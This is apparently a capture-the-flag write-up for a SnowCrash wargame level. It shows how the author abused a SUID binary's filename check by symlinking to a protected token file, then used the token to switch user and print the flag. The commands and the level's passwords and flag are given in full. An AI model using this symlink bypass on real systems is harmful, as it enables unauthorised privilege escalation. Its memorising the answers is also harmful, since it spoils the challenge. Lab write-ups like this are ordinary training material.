First Attempt:
	ls -l
		=> -rw-------  1 flag08 flag08    26 Mar  5  2016 token
			=> Cant do anything as level08
		=> -rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
			=> SUID flag08
				=> Reverse Engineering
	scp -P 4242 level08@192.168.1.23:~/level08 .
	bash script.sh
		=> New project
			=> Analyze /level08
				=> Too many lines to copy so I'll explain
					=> find occurences of "token" in argv[1]
						=> if occurence found => return
					=> open argv[1]
						=> if open is a success => read and display value
				=> First guess was we need to alter the values during execution
					=> Cant be done with Ghidra, we need gdb

	example:
		echo abc > /tmp/test
		./level08 /tmp/test
			=> abc

	gdb level08
		set args "token"
		disas main
			At first I tried to modify the file name after the strstr check which was a success on my gdb peda computer but wasnt able to reproduce it on snowcrash vm
				=> So I changed the check itself
		b *main+91
		run
		disas main
		x/s 0x8048793
			=> "token" hard coded
		set (*(char**)0x8048793) = "other"
		continue
			=> level08: Unable to open token: Permission denied
				=> Damn, it tries to open it but fails
				=> Obviously, Im mad for not thinking about it before but if you run a suid program in gdb it will be run as if it wasnt a suid

RESOLUTION:
	There was no setuid neither setgid and it wasnt possible to exploit it with gdb
	So let's try something else
	strstr(argv[1], "token")
		=> Lets change the name indirectly with a symbolic link
	ln -s `pwd`/token /tmp/whatever
	./level08 /tmp/whatever
		=> quif5eloekouj29ke0vouxean
	su flag08
		=> quif5eloekouj29ke0vouxean
	getflag
		=> Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
